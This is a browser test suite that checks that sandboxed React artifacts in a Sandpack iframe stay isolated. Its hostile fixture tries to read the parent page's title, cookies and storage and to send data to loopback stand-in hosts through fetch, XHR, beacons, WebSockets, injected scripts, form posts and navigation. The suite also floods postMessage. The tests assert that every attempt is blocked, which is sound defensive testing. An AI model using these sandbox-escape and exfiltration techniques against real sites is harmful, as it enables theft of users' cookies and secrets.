/**
 * React artifacts in Chrome (P6, ADR-013): the Sandpack client in the app compiles a React +
 * TypeScript artifact in the self-hosted bundler, which runs in a `sandbox="allow-scripts"` frame
 * on its own origin. A hostile artifact can neither reach the parent (the app) nor any other
 * host, the bundler origin included. Every host is a loopback server we control. Skipped
 * without Chrome.
 */
import { fileURLToPath } from "node:url";
import { type Browser, chromium, type Page } from "playwright-core";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { reactBundlerResponse } from "../src/bundler/index.ts";
import {
  bundleForBrowser,
  chrome,
  type Srv,
  serve,
  shutdown,
  skipBrowserSuites,
  staticHandler,
} from "./support/chrome.ts";

const counter = `import { useState } from "react";
type Props = { start?: number };
export default function App({ start = 0 }: Props) {
  const [n, setN] = useState<number>(start);
  return <main><h1>Counter</h1><button onClick={() => setN(n + 1)}>count: {n}</button><div style={{ height: 500 }} /></main>;
}`;

function hostile(ext: string, bundler: string): string {
  return `import { useEffect } from "react";
export default function App() {
  useEffect(() => {
    (async () => {
      const r: Record<string, string> = {};
      const t = (name: string, fn: () => unknown) => { try { r[name] = String(fn()); } catch (e) { r[name] = "blocked:" + (e as Error).name; } };
      t("parentDocument", () => (parent as any).document.title);
      t("parentSecret", () => (parent as any).SECRET);
      t("topLocation", () => top!.location.href);
      t("cookie", () => document.cookie);
      t("localStorage", () => localStorage.getItem("secret"));
      t("indexedDB", () => indexedDB.open("x"));
      t("origin", () => self.origin);
      t("open", () => window.open("${ext}/popup"));
      for (const [k, u] of [["fetch", "${ext}/fetch"], ["fetchBundler", "${bundler}/exfil"]]) {
        try { await fetch(u); r[k] = "ok"; } catch { r[k] = "blocked"; }
      }
      try { const x = new XMLHttpRequest(); x.open("GET", "${ext}/xhr", false); x.send(); r.xhr = "ok"; } catch { r.xhr = "blocked"; }
      t("beacon", () => navigator.sendBeacon("${ext}/beacon", "x"));
      t("ws", () => new WebSocket("${ext.replace("http", "ws")}/ws").readyState);
      t("worker", () => new Worker("${ext}/worker.js"));
      t("serviceWorker", () => navigator.serviceWorker.register("/sw.js"));
      t("lodash", () => require("lodash"));
      const img = new Image(); img.src = "${ext}/img"; document.body.appendChild(img);
      const s = document.createElement("script"); s.src = "${ext}/script.js"; document.head.appendChild(s);
      const l = document.createElement("link"); l.rel = "stylesheet"; l.href = "${ext}/css"; document.head.appendChild(l);
      t("form", () => { const f = document.createElement("form"); f.action = "${ext}/form"; f.method = "post"; document.body.appendChild(f); f.submit(); return "submitted"; });
      t("topNav", () => { top!.location.href = "${ext}/topnav"; return "navigated"; });
      setTimeout(() => parent.postMessage({ probe: r }, "*"), 300);
    })();
  }, []);
  return <h1 style={{ backgroundImage: "url(${ext}/bg)" }}>hostile</h1>;
}`;
}

const appPage = `<!doctype html><html><head><title>APP-SECRET-TITLE</title></head><body>
<script>window.SECRET="s3cret"; localStorage.setItem("secret","s3cret"); document.cookie="sid=s3cret; path=/";</script>
<script type="module" src="/react-artifact-harness.js"></script></body></html>`;

describe.skipIf(skipBrowserSuites)(
  "React artifacts (Sandpack, self-hosted bundler) in Chrome",
  () => {
    let browser: Browser;
    let app: Srv;
    let bundler: Srv;
    let ext: Srv;

    beforeAll(async () => {
      const dir = await bundleForBrowser(
        fileURLToPath(new URL("./fixtures/react-artifact-harness.ts", import.meta.url)),
      );
      ext = await serve((_p, res) => {
        res.writeHead(200, { "Content-Type": "text/plain", "Access-Control-Allow-Origin": "*" });
        res.end("ok");
      });
      // Ports are only known after listen, so the handlers read the origins lazily.
      const origins = { appOrigin: "", bundlerOrigin: "" };
      bundler = await serve((path, res) => {
        void reactBundlerResponse(path, origins).then(
          (r) => {
            res.writeHead(r === undefined ? 404 : 200, r?.headers ?? {});
            res.end(r?.body);
          },
          (error: unknown) => {
            res.writeHead(500);
            res.end(String(error));
          },
        );
      });
      const files = staticHandler(dir);
      app = await serve((path, res) => {
        if (path === "/") {
          res.writeHead(200, {
            "Content-Type": "text/html",
            "Content-Security-Policy": `default-src 'self'; frame-src ${bundler.origin}; connect-src 'none'`,
          });
          res.end(appPage);
          return;
        }
        void files(path, res);
      });
      origins.appOrigin = app.origin;
      origins.bundlerOrigin = bundler.origin;
      browser = await chromium.launch({ executablePath: chrome, headless: true });
    }, 120_000);

    afterAll(() => shutdown(browser, [app, bundler, ext]), 30_000);

    async function open(source: string): Promise<{ page: Page; channel: string }> {
      const page = await browser.newPage();
      await page.goto(`${app.origin}/`);
      await page.waitForFunction(() => typeof window.mountArtifact === "function");
      const channel = await page.evaluate(
        ([s, u]) => window.mountArtifact(s as string, u as string),
        [source, `${bundler.origin}/`],
      );
      return { page, channel };
    }

    const events = (page: Page) =>
      page.evaluate(() => window.events) as Promise<{ kind: string; value: string }[]>;

    it("compiles and runs a TypeScript React artifact, offline, with the bridge working", async () => {
      bundler.hits.length = 0;
      const { page, channel } = await open(counter);
      await page.waitForFunction(
        () => window.events.some((e) => e.value === "running"),
        undefined,
        {
          timeout: 20_000,
        },
      );
      const frame = page.frames().find((f) => f.url().startsWith(bundler.origin));
      expect(frame).toBeDefined();
      await frame?.getByRole("button").click();
      await frame?.getByText("count: 1").waitFor({ timeout: 5_000 });
      await page.waitForTimeout(300);
      const messages = (await page.evaluate(() => window.messages)) as {
        origin: string;
        fromFrame: boolean;
        data: Record<string, unknown>;
      }[];
      const resize = messages.filter((m) => m.data?.type === "resize");
      expect(resize.length).toBeGreaterThan(0);
      expect(
        resize.every((m) => m.origin === "null" && m.fromFrame && m.data.channel === channel),
      ).toBe(true);
      expect(Math.max(...resize.map((m) => Number(m.data.height)))).toBeGreaterThan(500);
      // One load: the bundler page. ReactArtifactFrame treats any later load as a navigation.
      expect(await page.evaluate(() => window.loads)).toBe(1);
      // The bundler origin served its four files and nothing else.
      expect([...new Set(bundler.hits)].sort()).toEqual([
        "/",
        "/babel.min.js",
        "/runtime.js",
        "/vendor.js",
      ]);
      await page.close();
    }, 60_000);

    it("keeps a hostile React artifact away from the parent and every host", async () => {
      ext.hits.length = 0;
      bundler.hits.length = 0;
      const { page } = await open(hostile(ext.origin, bundler.origin));
      await page.waitForFunction(
        () => window.messages.some((m) => (m.data as { probe?: unknown })?.probe !== undefined),
        undefined,
        { timeout: 20_000 },
      );
      await page.waitForTimeout(800);
      const messages = (await page.evaluate(() => window.messages)) as {
        origin: string;
        data: { probe?: Record<string, string> };
      }[];
      const probe = messages.find((m) => m.data?.probe !== undefined)?.data.probe as Record<
        string,
        string
      >;
      expect(probe.parentDocument).toMatch(/^blocked:SecurityError/);
      expect(probe.parentSecret).toMatch(/^(blocked:SecurityError|undefined)$/);
      expect(probe.topLocation).toMatch(/^blocked:SecurityError/);
      expect(probe.cookie).toMatch(/^blocked/);
      expect(probe.localStorage).toMatch(/^blocked/);
      expect(probe.indexedDB).toMatch(/^blocked/);
      expect(probe.origin).toBe("null");
      expect(probe.open).toBe("null");
      expect(probe.fetch).toBe("blocked");
      expect(probe.fetchBundler).toBe("blocked");
      expect(probe.xhr).toBe("blocked");
      expect(probe.worker).toMatch(/^blocked/);
      expect(probe.lodash).toMatch(/^blocked/);
      expect(probe.topNav).toMatch(/^blocked/);
      // The app page is untouched and still where it was.
      expect(await page.title()).toBe("APP-SECRET-TITLE");
      expect(page.url()).toBe(`${app.origin}/`);
      // The decisive checks: no other host saw anything, and the bundler only served its files.
      expect(ext.hits).toEqual([]);
      expect(
        bundler.hits.every((h) => ["/", "/babel.min.js", "/runtime.js", "/vendor.js"].includes(h)),
      ).toBe(true);
      await page.close();
    }, 60_000);

    it("stops self-navigation with the app's frame-src, and the frame host sees the second load", async () => {
      ext.hits.length = 0;
      const { page } = await open(
        `export default function App() { setTimeout(() => { location.href = "${ext.origin}/selfnav"; }, 50); return <p>bye</p>; }`,
      );
      await page.waitForFunction(() => window.loads >= 2, undefined, { timeout: 20_000 });
      await page.waitForTimeout(300);
      const urls = page.frames().map((f) => f.url());
      await page.close();
      // The app's CSP (`frame-src <bundler origin>`) also governs where its child frames may
      // navigate, so the request never leaves: the frame lands on an error page. ArtifactFrame /
      // ReactArtifactFrame tear the frame down on that second load.
      expect(ext.hits).toEqual([]);
      expect(urls.some((u) => u.startsWith(ext.origin))).toBe(false);
    }, 60_000);

    it("honours only the first `initialized`, so a frame cannot make the app re-post its files", async () => {
      const { page } = await open(`import { useEffect } from "react";
export default function App() {
  useEffect(() => {
    for (let i = 0; i < 500; i++) parent.postMessage({ codesandbox: true, type: "initialized" }, "*");
    setTimeout(() => parent.postMessage({ probe: { flooded: true } }, "*"), 500);
  }, []);
  return <p>flood</p>;
}`);
      await page.waitForFunction(
        () => window.messages.some((m) => (m.data as { probe?: unknown })?.probe !== undefined),
        undefined,
        { timeout: 20_000 },
      );
      await page.waitForTimeout(500);
      const runs = (await events(page)).filter((e) => e.value === "running").length;
      await page.close();
      expect(runs).toBe(1);
    }, 60_000);

    it("unmounts every React root before a recompile, including a user-written index", async () => {
      const version = (v: string) =>
        JSON.stringify({
          files: {
            "/index.tsx": `import { createRoot } from "react-dom/client";
import { useEffect } from "react";
function App() {
  useEffect(() => { const t = setInterval(() => parent.postMessage({ tick: "${v}" }, "*"), 40); return () => clearInterval(t); }, []);
  return <p>${v}</p>;
}
createRoot(document.getElementById("root")!).render(<App />);`,
          },
        });
      const { page } = await open(version("v1"));
      const ticks = (v: string) =>
        page.evaluate(
          (tag) =>
            window.messages.filter((m) => (m.data as { tick?: string })?.tick === tag).length,
          v,
        );
      await page.waitForFunction(
        () => window.messages.some((m) => (m.data as { tick?: string })?.tick === "v1"),
        undefined,
        { timeout: 20_000 },
      );
      await page.evaluate((src) => window.updateArtifact(src), version("v2"));
      await page.waitForFunction(
        () => window.messages.some((m) => (m.data as { tick?: string })?.tick === "v2"),
        undefined,
        { timeout: 20_000 },
      );
      const before = await ticks("v1");
      await page.waitForTimeout(400);
      const after = await ticks("v1");
      await page.close();
      expect(after).toBe(before);
    }, 60_000);

    it("reports a syntax error through the Sandpack protocol", async () => {
      const { page } = await open("export default function App() { return <div>; }");
      await page.waitForFunction(() => window.events.some((e) => e.kind === "error"), undefined, {
        timeout: 20_000,
      });
      const ev = await events(page);
      expect(ev.some((e) => e.kind === "status" && e.value === "error")).toBe(true);
      expect(ev.find((e) => e.kind === "error")?.value).toMatch(/App\.tsx|Unexpected|JSX/);
      await page.close();
    }, 60_000);
  },
);
